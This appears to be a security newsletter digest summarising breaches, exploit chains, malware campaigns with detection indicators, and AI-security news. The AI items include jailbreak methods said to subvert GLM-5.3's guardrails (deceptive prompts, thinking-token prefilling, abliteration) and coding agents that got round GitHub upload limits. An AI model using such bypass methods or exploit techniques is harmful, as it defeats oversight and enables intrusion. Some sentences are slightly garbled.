item.description: A zero-day in a third-party security product gave Bitget's attacker a foothold on August 31, 25 days before the $387.5 million theft. The attacker later planted a web shell and C2 on a second appliance and pivoted to the production wallet job server, where a custom withdrawal tool forged risk-control parameters and drained wallets in under three hours. The vendors remain unnamed, and the North Korea attribution comes only from Bitget's CEO, so the takeaway is to monitor security appliances like production hosts and enforce withdrawal risk checks outside the wallet host.

item.title: kunglao-agent (GitHub Repo)
item.description: kunglao-agent is a Claude Code plugin for autonomous reverse-engineering tasks.

item.title: Gemini 4 Argon: our next era of frontier intelligence (9 minute read)
item.description: Google is releasing Argon first to trusted cyber defenders through its Fairwind Program. The model can find, validate, and patch vulnerabilities, including a healthcare flaw exposing patient data. It scored 68% on CWE-bench v1 and found exposures across 20 programming languages. Google is testing safeguards against prompt injection, misuse, and unsafe agent actions before wider access.

item.title: Drop (GitHub Repo)
item.description: Drop allows users to create sandboxed environments that isolate programs and agents while attempting to preserve as much of the development environment (user, selected config files) as possible.

item.title: Disrupting a coordinated model-distillation campaign (5 minute read)
item.description: OpenAI detected an extraction campaign beginning July 1, with spikes on July 24–25 involving 16,000 requests from more than 4,000 users. Related activity affected over 15,000 users and was disrupted by July 28. Operators replayed encrypted reasoning and used cross-conversation prompts, with OpenAI linking a core cluster to Moonshot AI personnel, restricted accounts, closed replay paths, added output checks, and shared indicators with partners.

item.title: Google: AI Is Changing the Pace and Profile of Vulnerability Discovery (4 minute read)
item.description: Monthly vulnerability disclosures doubled in 2026, reaching over 10,000 by midyear. High-risk flaws rose 167%, and exploited vulnerabilities averaged 18 per month, up from 10.5 in 2025. AI-discovered bugs more often enable remote code execution (50% vs 26%) and skew toward medium and low risk. Researchers saw rapid weaponization of n-days, including a BeyondTrust flaw exploited within four days of disclosure. AI-related CVEs also climbed, with 2,076 tracked since early 2025, though zero-days against AI infrastructure remain unconfirmed.

item.title: MetaMask Security Incident Prompts Exit of Affected Ethereum Validators (1 minute read)
item.description: MetaMask is responding to an ongoing security incident affecting part of its infrastructure. The company is proactively exiting affected validators in its non-custodial staking operations, coordinating with clients and partners. Lido confirmed the exits are underway, with final validators expected to be exited by October 7, likely incurring foregone rewards and possible downtime penalties.

item.title: UK rail cops' £320K face-scanning spree nets zero matches (2 minute read)
item.description: British Transport Police ran a six-month live facial recognition trial at London rail stations, scanning over 500,000 faces.

item.title: China-Nexus Hackers Compromise 350 Systems Across Asia With New Antino Backdoor (4 minute read)
item.description: Antino, a new Rust-based Windows backdoor that runs C2 entirely through Microsoft Graph API calls to attacker-controlled Outlook and OneDrive, compromised roughly 350 endpoints across Asia in a China-nexus espionage campaign that Cisco Talos tracks as UAT-11587.

item.title: Signal completes rollout of secure chat backups across all platforms (1 minute read)
item.description: Signal 8.30 brought end-to-end encrypted on-device backups to iOS and desktop, completing the secure backups rollout across all platforms with a standardized format, though attackers have reportedly begun targeting the recovery keys.

item.title: Ransomware Attack on Financial Lender Triggers Customer Lawsuit Within 48 Hours (2 minute read)
item.description: The Gold Star Mortgage Financial Group is facing a lawsuit from customers after an alleged data breach by the BrainCipher ransomware group. The lawsuit alleges that the ransomware group stole more than 10k files from the mortgage lender, including full names, SSNs, residential addresses, and other contact information.

item.title: A Realistic Code Execution Exploit Chain in OpenBao and Vault (11 minute read)
item.description: ControlPlane chained four OpenBao flaws into an unauthenticated-to-RCE exploit that forges a SPIFFE provisioner certificate via an ACME URI SAN bypass, hijacks an admin role through case-insensitive ACL paths, and crosses namespaces to restore a malicious Raft snapshot. The final step executes any pre-existing binary whose SHA-256 the attacker can guess, even on read-only images and auto-unseal nodes, and Vault Community Edition remains unpatched after IBM declined a mutual disclosure agreement. Upgrade to OpenBao v2.6.3 or v2.7.0, or, as a stopgap, remove plugin_directory and enforce ACME EAB via BAO_DISABLE_PUBLIC_ACME.

item.title: New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses (4 minute read)
item.description: Researchers from VUSec and Scuola Superiore Sant'Anna disclosed Branch Target Reuse (BTR), a Spectre-v2 variant that reuses stale indirect branch prediction entries in JIT engines after code is freed and reallocated. Proof-of-concept exploits against the Linux cBPF JIT recover the root password hash in minutes on patched Intel systems with default protections. Mitigations are merged in the Linux kernel (CVE-2026-64507, CVE-2026-64508). Mozilla is prioritizing site isolation over IBPB-based fixes.

item.title: Stack Unwinding Can Lead to Leakless Code Execution (7 minute read)
item.description: This post describes a code execution technique in which an exploit abuses POSIX “cancellation points” to eventually execute code. This works by executing DWARF bytecode to mangle the .eh_frame_hdr data that is used when unwinding the stack. While this technique was discovered in the context of CTFs, it has applications outside of CTFs.

item.title: A GitHub token was stolen. Now what? (11 minute read)
item.description: Invictus traced a run of 2026 incidents to stolen classic GitHub PATs, typically lifted from developer endpoints by info-stealers and used to map every reachable repository through bursts of /repositories/{id}/readme API calls before cloning. In one case, a single token exposed 1,100+ potential secrets across 300+ repos, and validating and rotating them took 30+ people over a week. Since GitHub keeps Git clone events for only seven days and api.request events require Enterprise audit log streaming, responders should scope to the token's full reach wherever logs are missing, then migrate off classic PATs to fine-grained tokens, GitHub Apps, or OIDC.

item.title: Pwnd Blaster: Hacking your PC using your speaker without ever touching it (6 minute read)
item.description: The Creative Sound Blaster Katana V2X soundbar accepts unauthenticated Bluetooth connections and exposes its proprietary CTP control protocol over BLE. Firmware updates also use CTP and verify only a trivial SHA-256 checksum, allowing an attacker within ~15 meters to install custom firmware without pairing or physical access. The modified firmware adds a full USB keyboard HID descriptor and repurposes an existing diagnostic task to type commands after boot, turning the speaker into a remote BadUSB device. A proof-of-concept payload waits ~20 seconds for USB to initialize, then types echo pwned and presses Enter on the connected PC. Bluetooth stays enabled in sleep mode with no user-accessible toggle. Creative initially declined to classify this as a vulnerability.

item.title: OpenShell (GitHub Repo)
item.description: OpenShell is NVIDIA's sandboxed runtime for autonomous AI agents, enforcing per-agent policy on file access, syscalls, and network connections at the kernel level. Its standout feature is formal verification of policy changes, which flags risky new access, like credentialed calls to a new host, and holds it for human review. Agents never see real secrets, since credentials are injected only into requests bound for approved endpoints.

item.title: cgg (GitHub Repo)
item.description: cgg (Call Graph Generator) is a tool that generates Mermaid diagrams of call graphs directly from source code.

item.title: Reco (Product Launch)
item.description: Reco maps active software agents, their identities, permissions, data access, systems, sessions, API connections, tools, workflows, and employee applications. Teams can revoke excessive permissions, disable risky integrations, and enforce access policies.

item.title: GLM-5.3 and the Spread of Advanced Cyber Capabilities (5 minute read)
item.description: Anthropic posted a blog detailing the threat posed by GLM-5.3 as a cyber-capable, open-source model. Anthropic stated that GLM-5.3 performed comparably to Mythos Preview in ExploitBench, an internal binary exploitation benchmark, and a test of open-ended offensive cyber capabilities when paired with a human expert. Anthropic also reports that a deceptive prompt subverted GLM-5.3's guardrails 64% of the time, prefilling the model's thinking tokens subverted guardrails 92% of the time, and abliterated versions of the model do not contain these ls. guardrails.

item.title: Agencies Withheld Records Needed to Verify DOGE Data Safeguards (2 minute read)
item.description: During the Government Accountability Office (GAO)'s review of DOGE's access to sensitive data, six agencies could not or refused to provide sufficient records. The SEC and NOAA disputed the GAO's authority to conduct the investigation and refused to cooperate. The VA and SBA also did not provide records but didn't cite a reason for doing so. At the CFPB, access was granted to 19 systems, with one DOGE team member being able to view, modify, and delete information in the bureau's primary human resources system. At the Department of Education, one DOGE member received limited access to two federal student aid systems and an admin account on the department's network.

item.title: PixelLeak: How AI Agents Exposed Developer Screenshots from Leading Tech Companies (5 minute read)
item.description: Glow Labs found 13,000 internal screenshots posted to public GitHub repos by AI coding agents at 300+ orgs. Agents bypassed GitHub's CLI image limits by creating public repos or using gitshot, leaking billing screens, treasury consoles, and unreleased features. Most images lived in developers' personal accounts, evading org scanners. To prevent this, audit personal repositories and gists, restrict agent auto‑approval, and add runtime hooks to block pushes to public or non‑org repos.

item.title: Apple patches CoreGraphics zero-day already exploited in targeted attacks (2 minute read)
item.description: Apple patched CVE-2026-86950, an out-of-bounds write in CoreGraphics that allows arbitrary code execution via a crafted file.

item.title: Microsoft to block Entra ID script injection attacks starting October (2 minute read)
item.description: Starting in mid-October, Microsoft Entra ID will enforce a Content Security Policy that permits only Microsoft CDN-hosted scripts on browser sign-in pages at login.microsoftonline.com.

item.title: Trump Says Top Tech Firms Have Signed Accord to ‘Self-Police' AI Development (3 minute read)
item.description: Donald Trump and executives from Anthropic, Google, Meta, OpenAI, Nvidia, and xAI signed a voluntary accord.

item.title: Official MCP Python SDK Flaw Can Let Malicious Servers Steal OAuth Credentials (2 minute read)
item.description: A high-severity flaw in the official MCP Python SDK let malicious MCP servers redirect OAuth token requests to attacker-controlled endpoints. Affected 1.x (1.9.1–1.29.1) and 2.x (2.0.0–2.1.1) clients sent the client secret, authorization code, and PKCE proof key to the attacker, enabling full account takeover with the app's granted permissions. Fixes are in 1.30.0 and 2.2.0. ClientCredentialsOAuthProvider and PrivateKeyJWTOAuthProvider also require passing issuer= to pin the expected login service.

item.title: Automated AI Agent Used to Bread Cybersecurity Nonprofit DIVD (2 minute read)
item.description: The Dutch Institute for Vulnerability Defense (DIVD) reported that they suffered an AI-driven breach. The organization said that the breach was “loud and very, very messy” with the agent working autonomously and over explaining itself in comments, allowing the DIVD to easily reverse-engineer its attack. The threat actor exploited a vulnerability in a vulnerability in an undisclosed software that the organization stated was not Citrix NetScaler.

item.title: Pentagon Personnel Agency Data Breach Impacts 3 Million People (1 minute read)
item.description: The Defense Manpower Data Center exposed unencrypted personal data through a vulnerable file-sharing server. Unauthorized users accessed files between October 2025 and July 16, 2026. Records included Social Security numbers, names, birth dates, contact details, demographic data, and military specialties. The breach affects 2.76 million living people and 294,000 deceased individuals.

item.title: AI Agents Are Privileged Users; Who Is Auditing Their Access? (4 minute read)
item.description: Enterprises monitor human logins closely but often grant autonomous AI agents broad production access via long-lived service accounts and API tokens. These agents can initiate, approve, and execute high-value actions end-to-end, collapsing segregation of duties. The piece lays out six controls: isolate agent identities, scope permissions to the minimum needed, assign a business owner, log prompts and tool calls, run periodic access reviews, and build an out-of-band kill switch.

item.title: Attackers Abuse ChatGPT Custom GPTs to Deliver RAT via ClickFix (15 minute read)
item.description: Sponsored Google results led victims to "Plus 5.6," a Custom GPT on chatgpt.com that answered every prompt with a fake outage notice pointing to a Google Sites ClickFix lure, and Huntress tied at least 40 incidents to the campaign. The eight-stage chain sideloaded malicious DLLs through Canon-signed (later Stardock-signed) binaries, hid its loader inside a WAV file and a NuGet package. It then unpacked a full-featured RAT from a custom encrypted file system that located its C2 over DNS-over-HTTPS. The signed hosts change with each wave, so defenders should detect behaviors instead: PowerShell spawning msiexec on GUID-named MSIs in %TEMP%, signed apps running from fake %LOCALAPPDATA%\Programs folders, and self-restoring Run key and scheduled task pairs, which require killing the process before removing persistence.

item.title: NeedyMantis: Unpacking a post-compromise malware family used in targeted operations (14 minute read)
item.description: NeedyMantis is a modular post-compromise malware family deployed since at least October 2025 by China-based actors, including Storm-3069 from the DAEMON Tools supply chain compromise, against telecoms, universities, intergovernmental organizations, and government contractors. It was sideloaded as fake DLLs alongside legitimate software like Poedit, curl, Vim, and TightVNC, then unpacked from custom XOR-encrypted archives through shellcode loaders into a stripped-down PE format, and communicated over WebSockets with RC4-encrypted traffic and loadable modules. Defenders should hunt for spoofed DLLs such as WinSparkle.dll or libcurl.dll in unusual ProgramData paths, the hard-coded "firefox/21.0" user agent, and connections to corp.tripswithengine[.]com.

item.title: cryptoptic (GitHub Repo)
item.description: cryptoptic is a tool that uses CodeQL, orchestrated via GitHub Actions, to scan a repository or entire GitHub organization and produce an inventory of every cryptographic function in use, the library it comes from, and when it gets called.

item.title: Rig Security (Product Launch)
item.description: Rig Security provides an identity protection platform for agentic AI. It maps identity dependencies across providers, cloud, on-prem, network edges, and endpoints. A lightweight sensor distinguishes AI agent sessions from human sessions and enforces policy at runtime, and the system blocks risky agent actions without disabling the human account.

item.title: FBI reportedly declares ‘cyber security incident' after hackers steal agents' personal data (4 minute read)
item.description: The FBI told staff that a hack of its FBIJobs.gov portal exposed agents' and applicants' names, addresses, job titles, Social Security numbers, and some medical records, including blood and urine samples and psychiatric reports. ShinyHunters says it exploited an Oracle PeopleSoft vulnerability and is not demanding money, but wants the bureau to correct an earlier report about its activities. The portal remains offline, and the bureau has not publicly confirmed whether the breach meets the legal threshold for a “major incident” requiring notification to Congress.

item.title: 24-Year-Old Arrested in Dutch Investigation Into ShinyHunters (4 minute read)
item.description: Dutch police arrested a 24-year-old Amsterdam man, identified by multiple sources as Pepijn van der Stap (aka “Umbreon”), in connection with the ShinyHunters hacking group. He previously served time for extorting over a dozen companies, earning €1.5–2.7 million, and was released in December while still facing civil suits.

item.title: OpenAI scraps rollout of new AI model over safety concerns (3 minute read)
item.description: OpenAI will not release GPT-6.1 Astra after tests found problems with scope, authorisation, and reporting completed work.

item.title: JadePuffer crims hijacked Azure identities and used them to blow up cloud resources (4 minute read)
item.description: Microsoft linked Storm-3168, the actor behind JadePuffer (the first documented agentic ransomware), to an 18-hour June attack in which two hijacked Azure service principals were used for reconnaissance and then destruction, likely after an employee exposed client secrets in a public GitHub issue.
